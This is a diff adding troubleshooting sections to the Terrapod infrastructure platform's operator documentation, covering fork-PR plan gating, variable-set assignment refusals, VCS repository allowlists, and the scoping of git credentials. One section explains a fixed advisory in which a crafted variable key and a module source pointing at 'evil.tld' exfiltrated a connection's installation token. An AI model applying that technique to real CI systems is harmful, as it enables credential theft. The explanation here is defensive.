@@ -1192,6 +1192,78 @@ service=terrapod-api logger=terrapod.services.vcs_status_dispatcher
 
 ---
 
+## A pull request from a fork gets no plan
+
+**Symptom**: a contributor opens a pull request from their own fork, every
+other pull request on the repository plans normally, and this one produces no
+run at all — no errored run, no commit status, nothing in the workspace's run
+list.
+
+**Why**: this is the default, not a fault. A speculative plan runs the pull
+request author's code with the workspace's full credential set, and a fork
+author has neither write access to the base repository nor the ability to
+merge — so the plan would be the only path by which their code reaches those
+credentials. `allow-fork-pr-plans` is `false` by default, so assume a fork pull request does not plan unless someone turned it on
+([GHSA-gp5w-76rw-c452](https://github.com/mattrobinsonsre/terrapod/security/advisories/GHSA-gp5w-76rw-c452)).
+
+A pull request from a branch **in the repository itself** is never affected by
+this. If one of those stopped planning, the cause is elsewhere — start at
+[Speculative plans not appearing for
+PRs/MRs](vcs-integration.md#speculative-plans-not-appearing-for-prsmrs).
+
+### Diagnosis
+
+The poller logs each skip, with the workspace and the pull request:
+
+```sh
+kubectl logs deploy/terrapod-api --tail=2000 | grep fork_plan_skipped
+```
+
+`vcs.pr.fork_plan_skipped` is the workspace case;
+`module_impact.fork_pr_skipped` and
+`module_impact.fork_pr_skipped_for_workspace` are the module-impact ones.
+
+Then read the setting:
+
+```sh
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "$TERRAPOD_URL/api/v2/workspaces/$WS_ID" \
+| jq '.data.attributes."allow-fork-pr-plans"'
+```
+
+One more thing to rule out before concluding it is a fork: Terrapod fails
+**closed**, so a pull request whose head repository has been deleted is
+treated as a fork even though it was raised from a branch. The log line names
+the pull request, so compare it with what the provider shows.
+
+### Resolution
+
+Decide whether this workspace should accept code from outside the
+repository's write boundary. If it should — a public module repository taking
+community contributions, with a workspace holding nothing worth taking:
+
+```sh
+curl -X PATCH "$TERRAPOD_URL/api/v2/workspaces/$WS_ID" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/vnd.api+json' \
+  -d '{"data":{"type":"workspaces","attributes":{"allow-fork-pr-plans":true}}}'
+```
+
+The next poll cycle picks the pull request up; no push to the branch is
+needed, because the gate is re-evaluated each cycle and nothing was recorded
+for the skipped commit.
+
+If it should not, say so on the pull request rather than leaving it silent —
+the contributor sees no status at all, which looks like the integration being
+broken. A maintainer can reproduce the plan by pushing the branch into the
+repository itself, which puts the code back inside the write boundary and
+makes the review a deliberate act.
+
+For a workspace created by autodiscovery, set it on the **rule** as well, or
+the next workspace the rule creates starts from the default again.
+
+---
+
 ## AI plan-summary daily token budget exhausted
 
 **Symptom**: AI plan summary panels on run detail pages start showing "Summary skipped for this run" (italic grey muted text) instead of the LLM description. New `plan_summaries` rows arrive with `status='skipped'` and `error_message='daily token budget exhausted'`. With the policy gate off, the run lifecycle itself is unaffected (plan / apply / lock state machine continues normally) and only the summary surface is muted. **Unless the policy gate is on** (`ai_summary.policy.enabled`): under `enforcement_level: mandatory` a budget exhaustion or a model fault records an `errored` verdict, and an errored verdict HOLDS the run — the gate fails closed, so an AI outage does stop applies. Check `blocked-by: ai-policy` on held runs before concluding the AI subsystem cannot be the cause.
@@ -2269,3 +2341,393 @@ are re-claimed automatically and need nothing more.
 Press **Check** again and confirm every step passes, then re-queue the errored
 run. On the status page, the next sample should show the instance reachable
 with a working login.
+
+---
+
+## A workspace write is refused with a 403 about a variable set
+
+Creating or updating a workspace returns **403** with a message naming one or
+more variable sets, saying the change would make the workspace match their
+assignment rule.
+
+This is working as intended. An assignment rule selects on attributes the
+workspace's own owner controls — labels, name, execution mode, agent pool, engine
+version, VCS connection — and a variable set has no per-set permissions, so the
+match itself would be the grant. A caller who is **not** a platform admin
+therefore may not **grow** the set of rule-assigned variable sets reaching a
+workspace. (GHSA-49q6-pm68-3xgw)
+
+**It is scoped to sets that hold a secret.** The refusal fires only when a set the
+workspace newly matches carries a `sensitive` variable or one resolved through
+OpenBao/Vault — the reported impact. A rule-assigned set of plain configuration
+still joins automatically, because that is the feature working, and a guard that
+refused every match would also refuse the documented self-service workflow and
+every service-catalog item whose labels match a rule.
+
+**Two rule dimensions are refused outright.** `drift_status` and `locked` are
+platform state a workspace's own owner can move — through `dismiss-drift`, through
+disabling drift detection, and through lock/unlock, none of which is a variable-set
+write — so a rule selecting on either is rejected with `422`, and a rule stored
+before this release that names one matches nothing. Select on something an admin
+controls, such as labels.
+
+**It is a behaviour change**, so expect it on first upgrade from any self-service
+workflow that created workspaces carrying labels a rule-scoped set selects on,
+and from a non-admin running the OpenTofu/Terraform provider.
+
+### Symptoms
+
+- `403` on `POST /api/v2/organizations/default/workspaces` or
+  `PATCH /api/v2/workspaces/{id}`, detail beginning "This change would make the
+  workspace match the assignment rule of variable set …"
+- No workspace is left behind by a refused create — the change is rolled back
+- The API server log carries `refused a workspace change that would pull in a
+  rule-assigned variable set`, with the actor and the set names
+- A non-admin `tofu apply`/`terraform apply` of `terrapod_workspace` fails on the
+  create or the update, not on the plan
+
+### Diagnosis
+
+1. **Read the message.** It names the variable sets, which is what you need to ask
+   about. The names are not secret; the values are.
+
+2. **Find the rule that is matching.** Admin only:
+
+   ```zsh
+   curl -sH "Authorization: Bearer $TOKEN" \
+     "$TERRAPOD/api/terrapod/v1/varsets/<varset-id>/relationships/workspaces"
+   ```
+
+   and from the set itself, `assignment-rule` on
+   `GET /api/v2/organizations/default/varsets`. Compare its dimensions against
+   the attributes the refused request was setting.
+
+3. **Work out which attribute did it.** The usual suspects are the ones a rule can
+   select on: `labels`, `name`, `execution-backend`, `execution-mode`,
+   `terraform-version`, `engine-version`, `agent-pool-id`/`agent-pool-ids`,
+   `vcs-connection-id` (as attribute *or* relationship), `vcs-repo-url` and
+   `owner-email`.
+
+   But do **not** read that as a closed list — the guard is a *denylist* and fails
+   open on purpose. It skips the check only for attributes proven unable to move a
+   rule dimension (`description`, `auto-apply`, `slack-channel`, `debug-mode` and
+   about twenty others); **anything outside that list triggers it**, including an
+   attribute added after the list was written, and **any relationship in the body
+   triggers it unconditionally**. An allowlist of triggering keys was tried first and
+   was the bug: a new attribute silently escaped the check.
+
+   So a refusal on a seemingly unrelated edit is expected behaviour, not a puzzle —
+   the request still has to *grow* the set of secret-bearing rule-assigned sets to be
+   refused, which step 4 is how you confirm.
+
+4. **Confirm it is growth, not membership.** These are all still allowed, so if
+   one of them is being refused, that is a bug worth reporting:
+
+   | Allowed | Why |
+   |---|---|
+   | An edit to a workspace that **already** matches | The test is growth, not presence |
+   | **Dropping** a label that was pulling a set in | Shrinking is a de-escalation |
+   | Matching a **global** set | It already reaches every workspace |
+   | Matching an **explicitly assigned** set | An admin assigned it to this workspace deliberately |
+
+5. **Check what the workspace receives today**, which answers "where did this
+   variable come from". Needs only `workspace:read`:
+
+   ```zsh
+   curl -sH "Authorization: Bearer $TOKEN" \
+     "$TERRAPOD/api/terrapod/v1/workspaces/<workspace-id>/varsets"
+   ```
+
+   Each entry's `assignment-source` is `explicit`, `global` or `rule`.
+
+### Resolution
+
+Pick whichever matches the intent — the first two are the right answers, and the
+third is the one to reach for only when the rule itself is wrong:
+
+1. **A platform admin makes the change.** An admin is exempt, because an admin can
+   already read every variable set and so has nothing to escalate to. Right answer
+   when the workspace genuinely should receive the set.
+2. **A platform admin assigns the set to the workspace explicitly**
+   (`POST /api/v2/varsets/{id}/relationships/workspaces`). The caller can then set
+   whatever attributes they like, because an explicit assignment does not count as
+   growth. Right answer when a team should own the workspace day to day.
+3. **Change the attribute so it does not match** — pick a different label value or
+   name. Right answer when the match was accidental, which it often is where a
+   rule selects on a broadly-used label such as `env`.
+
+If the refusal revealed that a rule is **wider than intended**, treat it as the
+more serious finding and narrow the rule: see
+[A variable set is applying to workspaces I did not expect](#a-variable-set-is-applying-to-workspaces-i-did-not-expect).
+A set whose rule was too wide for a while should have its credential rotated.
+
+For a self-service workflow that is now blocked wholesale, prefer giving the
+affected workspaces an explicit assignment over granting the caller admin.
+
+### Verification
+
+Re-send the refused request and confirm a `201`/`200`. Then confirm the workspace
+receives what you expect:
+
+```zsh
+curl -sH "Authorization: Bearer $TOKEN" \
+  "$TERRAPOD/api/terrapod/v1/workspaces/<workspace-id>/varsets"
+```
+
+The same resolver backs this view and run-time injection, so what is listed is
+what the next run receives.
+
+---
+
+## A run cannot fetch its repository
+
+A run errors before it plans, with a message saying the VCS connection is
+restricted to specific repositories and the workspace's repository is not one of
+them — or `GET …/vcs-refs` returns **403** and the branch/tag picker in the run
+dialog will not populate.
+
+This is the repository allowlist on the VCS connection. `allowed-repositories` is
+empty by default and empty means any repository the credential can reach, so this
+only appears once an operator has narrowed a connection — and it is **expected**
+immediately afterwards for any workspace already pointing outside the new
+patterns, because narrowing does not rewrite stored workspace rows.
+(GHSA-v8g7-pqrj-8mcm)
+
+### Symptoms
+
+- A run errors with `VCS connection vcs-… is restricted to specific repositories
+  and '…' is not one of them`, with no plan output
+- `GET /api/terrapod/v1/workspaces/{id}/vcs-refs` returns **403** with the same
+  shape of message, naming the allowed patterns
+- Workspace `PATCH` returns **403** on an otherwise valid edit, because the
+  allowlist is re-checked on every update that leaves a connection attached
+- Polling-driven runs keep failing on each cycle; nothing is cloned
+- **No HTTP error anywhere, but the workspace stops picking up commits.** The
+  allowlist is also enforced inside the two functions that use the credential, so a
+  VCS poll cycle or a drift check refuses the clone with nothing to return a 403 to.
+  Look for `its credential will not be used to clone it` in the API logs, naming the
+  connection and the `owner/repo` it refused. This is the case to know about, because
+  the workspace simply goes quiet
+- A minted `git_http_auth` credential fails the run with `a credential installed for
+  '…' would reach more than those` — a **different** problem, below
+
+Distinguish this from the other 403 on the same resource: *"Not authorized to use
+VCS connection vcs-…"* is a **claim** problem (who may name the connection), not a
+scoping one. The two have different remedies, which is why the messages differ —
+for the claim case see
+[vcs-integration.md → Naming a VCS connection](vcs-integration.md#naming-a-vcs-connection-is-authorized).
+
+### Diagnosis
+
+1. **Read the patterns out of the message.** It lists up to five, then a count of
+   the rest.
+
+2. **Compare them against the workspace's URL.** Admin only for the connection:
+
+   ```zsh
+   curl -sH "Authorization: Bearer $TOKEN" \
+     "$TERRAPOD/api/terrapod/v1/vcs-connections/vcs-<id>" \
+     | jq '.data.attributes["allowed-repositories"]'
+   ```
+
+   A pattern is matched against **both** the full URL as stored and the
+   `owner/name` path with any `.git` suffix removed, so `platform-team/*` matches
+   `https://github.example.com/platform-team/service.git`.
+
+3. **Check the three things that most often explain a surprising non-match:**
+
+   | Cause | Example |
+   |---|---|
+   | **Case.** Patterns are case-sensitive | `Platform-Team/*` does not match `platform-team/service` |
+   | A pattern pinned to a **host** that no longer matches | `https://github.example.com/org/*` against a workspace URL stored in SSH form |
+   | A **blank** repository URL on the workspace | A narrowed connection refuses an empty target rather than allowing it |
+
+   Note `*` **crosses `/`**, so `platform-team/*` does match a nested subgroup
+   path — a too-deep path is rarely the cause.
+
+4. **Find every workspace on the connection that is now out of scope**, since the
+   one that errored is unlikely to be the only one:
+
+   ```sql
+   SELECT w.name, w.vcs_repo_url
+   FROM   workspaces w
+   JOIN   vcs_connections c ON c.id = w.vcs_connection_id
+   WHERE  c.name = '<connection-name>'
+   ORDER  BY w.vcs_repo_url;
+   ```
+
+5. **If nothing looks narrowed at all**, confirm you are looking at the right
+   failure. A connection with `allowed_repositories = '[]'` enforces nothing, and
+   an ordinary clone failure (a revoked credential, a provider outage, a renamed
+   repository) reports the provider's own error instead.
+
+### Resolution
+
+- **The workspace is legitimate** → a platform admin widens the connection's
+  patterns. Send the whole list; the attribute replaces rather than appends:
+
+  ```zsh
+  curl -X PATCH "$TERRAPOD/api/terrapod/v1/vcs-connections/vcs-<id>" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/vnd.api+json" \
+    -d '{"data": {"type": "vcs-connections", "attributes": {
+          "allowed-repositories": ["platform-team/*", "shared/terraform-modules"]}}}'
+  ```
+
+- **The workspace should use a different connection** → repoint it, which needs a
+  claim to the new connection and brings its allowlist with it.
+- **The workspace should not exist** → the allowlist caught something real.
+  Investigate who created it and what it pointed at before deleting it.
+- **You need the restriction gone entirely** → send `"allowed-repositories": []`,
+  which restores "any repository the credential can reach". Prefer widening over
+  clearing.
+
+Omitting the attribute from a `PATCH` leaves it unchanged, so an unrelated edit to
+the connection cannot clear it by accident.
+
+### Verification
+
+Re-queue the run and confirm it reaches `planning`. The refs endpoint is the
+quicker check, since it exercises the same allowlist at workspace-read:
+
+```zsh
+curl -sH "Authorization: Bearer $TOKEN" \
+  "$TERRAPOD/api/terrapod/v1/workspaces/<workspace-id>/vcs-refs"
+```
+
+A `200` carrying branches and tags means the workspace is inside the connection's
+scope again. Re-run the query in step 4 to confirm no other workspace on the
+connection is still outside it.
+
+### Prevention
+
+Before narrowing a connection, run the query in step 4 and widen the patterns to
+cover every repository already in use; then remove entries as those workspaces are
+retired. See
+[security-hardening.md → Scope every VCS connection](security-hardening.md#scope-every-vcs-connection-to-an-owner-and-a-repository-set).
+
+## A minted git credential is refused for naming the wrong host
+
+A run fails with `git credential scope '…' names host '…', but VCS connection vcs-…
+serves '…'`.
+
+The variable's key is the scope the runner installs the token at, written verbatim
+into a git `[credential "https://<key>"]` section — so git sends that token to
+whatever host the key names. A credential minted from a connection is therefore only
+ever installed for **that connection's own host**, whatever the repository allowlist
+says, and **whether or not an allowlist is set at all**.
+
+**Fix the key's host.** For a GitHub connection that is `github.com`, or your GitHub
+Enterprise host — note the connection's `server-url` holds the **API** base
+(`https://ghe.example.com/api/v3`), while the key needs the git host
+(`ghe.example.com`). For GitLab the `server-url` host is the git host directly.
+
+If you genuinely need to authenticate to a different host, that is what a `static`
+credential is for: supply a token you have scoped yourself, and it is not checked
+against the connection. (GHSA-v8g7-pqrj-8mcm)
+
+### Why this is not negotiable
+
+The check is why a workspace variable cannot be used to exfiltrate a connection's
+credential. The mint path deliberately skips the connection-authorization check for
+the workspace's **own** connection, so anyone who can write a workspace variable
+chooses the key — and before this release a key of `evil.tld/myorg` passed a
+connection restricted to `myorg/*`, installed the GitHub App installation token for
+`evil.tld`, and a module source of `git::https://evil.tld/myorg/x.git` in the
+workspace's own configuration sent it there. That token carries `contents: read`
+across the whole installation.
+
+## A minted git credential is refused for being too broadly scoped
+
+A run fails during `init` — or at variable resolution, before `init` — with
+`git credential '…' references VCS connection vcs-…: … a credential installed for
+'…' would reach more than those`.
+
+This is the repository allowlist again, but the subject is **the variable's key**,
+not the workspace's repository. A `git_http_auth` variable sourced from a VCS
+connection is installed by the runner as a git `[credential "https://<key>"]`
+section, and git applies such a section by host **and path prefix**. So a key of
+`github.com` installs the token for the whole host, and the workspace's own
+configuration can then clone anything that credential reaches — which is why the
+allowlist has to bound the key rather than the repository the workspace happens to
+be configured with. (GHSA-v8g7-pqrj-8mcm)
+
+### Symptoms
+
+- The message names a **key**, says "a credential installed for", and mentions
+  "path prefix" — the plain repository refusal says "and '…' is not one of them"
+- It appears for a workspace whose own repository **is** inside the allowlist, which
+  is what makes it confusing: the workspace is in scope and the credential is not
+- Only `source = "vcs_connection"` credentials are affected. A `static` credential
+  carries a token you scoped yourself and is never checked against the allowlist
+
+### Diagnosis
+
+Read the variable's key and the connection's patterns:
+
+```zsh
+curl -sH "Authorization: Bearer $TOKEN" \
+  "$TERRAPOD/api/terrapod/v1/workspaces/<workspace-id>/vars" \
+  | jq -r '.data[] | select(.attributes.category=="git_http_auth")
+           | "\(.attributes.key)"'
+
+curl -sH "Authorization: Bearer $TOKEN" \
+  "$TERRAPOD/api/terrapod/v1/vcs-connections/<connection-id>" \
+  | jq -r '.data.attributes["allowed-repositories"]'
+```
+
+A key is accepted when every repository it could reach is inside the allowlist. So
+`github.com/myorg` is accepted by `myorg/*` or by `myorg`, and refused by
+`myorg/safe` — because the key covers all of `myorg` and the pattern covers one
+repository. A bare `github.com` is refused by anything narrower than `*`.
+
+### Resolution
+
+**Narrow the key, which is almost always the right fix.** Set it to the owner or the
+repository the credential is actually for:
+
+| key | reaches | accepted by |
+|---|---|---|
+| `github.com` | the whole host | `*` only |
+| `github.com/myorg` | everything under `myorg` | `myorg`, `myorg/*` |
+| `github.com/myorg/safe` | that repository | `myorg/safe`, `myorg/*` |
+
+The alternatives are to widen `allowed-repositories` on the connection, which
+widens it for every workspace using that connection, or to switch the variable to
+`source = "static"` with a token you have scoped yourself — which is the better
+answer when the credential genuinely needs reach the connection should not have.
+
+### Verification
+
+Re-queue the run and confirm it reaches `planning`. The refusal happens while the
+server resolves variables, so it fails fast and the message names the key it
+refused — a run that gets past `init` has the credential it needs.
+
+## A listener re-join logs an orphaned name and gets a new id
+
+The API logs `listener name maps to a record that no longer exists; registering
+fresh rather than adopting an unverifiable id`, and the listener appears in the pool
+with a new id while the old one disappears from the list.
+
+This is expected and self-healing. A listener's name → id mapping and its own record
+are separate Redis keys with the same TTL, refreshed together by every heartbeat. If
+they diverge — an eviction under memory pressure, a cluster failover losing one slot,
+or the pipeline that writes them partially applying, which it can because the two
+prefixes hash to different slots in cluster mode — the name points at a record that
+is gone. Terrapod will not adopt that id, because there is no way to read which pool
+owned it, and writing the joining pool's id into it is precisely the cross-pool
+redirect the join check exists to refuse. (GHSA-vr88-c3hx-xr4h)
+
+### What to check
+
+Nothing, if it happens once. The listener re-registers, the stale name key is
+overwritten, and runs dispatch normally. If it repeats on every join, the Redis
+instance is losing keys — check `maxmemory-policy` (it should not be an `allkeys-*`
+eviction policy; Terrapod's keys all carry their own TTLs) and the instance's
+eviction counters.
+
+Distinguish it from the refusal on the same path: `A listener named '…' is already
+registered to a different agent pool` is a **409** and is not self-healing. That one
+means two pools are using the same listener name, which has no legitimate meaning —
+rename one listener, or delete the registration from the pool that holds it.
+
